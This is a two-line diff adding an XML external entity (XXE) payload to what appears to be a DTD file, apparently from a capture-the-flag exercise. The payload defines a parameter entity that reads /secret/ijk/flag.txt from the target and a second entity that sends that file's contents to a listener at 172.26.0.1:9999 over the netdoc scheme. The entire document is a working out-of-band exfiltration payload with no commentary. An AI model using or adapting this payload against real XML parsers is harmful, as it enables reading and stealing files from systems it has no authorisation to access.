@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///secret/ijk/flag.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'netdoc://172.26.0.1:9999/%file;'>">
